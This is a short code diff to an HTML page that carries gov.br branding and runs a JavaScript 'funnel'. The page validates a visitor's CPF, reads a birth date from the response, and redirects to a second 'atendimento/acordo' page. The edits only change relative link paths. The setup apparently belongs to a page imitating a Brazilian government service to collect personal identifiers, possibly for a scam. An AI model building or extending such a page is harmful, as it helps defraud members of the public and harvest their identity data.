@@ -17,7 +17,7 @@
 <body>
   <div class="page-wrap">
     <header class="hdr hdr--cpf">
-      <a href="../index.html" class="hdr-logo-link" aria-label="gov.br">
+      <a href="index.html" class="hdr-logo-link" aria-label="gov.br">
         <img src="images/iconegov.png" alt="" class="hdr-logo-img" width="100" height="32">
       </a>
       <div class="hdr-right hdr-right--icons-only">
@@ -159,7 +159,7 @@ if (json.DADOS.data_nascimento) {
 }
 
 // Continua o funil: Parte 1 (CPF) -> Parte 2 (atendimento/acordo)
-window.location.href = '../pt2/index.html?' + next.toString();
+window.location.href = 'atendimento.html?' + next.toString();
 return;
 }
           alert((json && json.error) || 'Não foi possível validar o CPF. Tente novamente.');
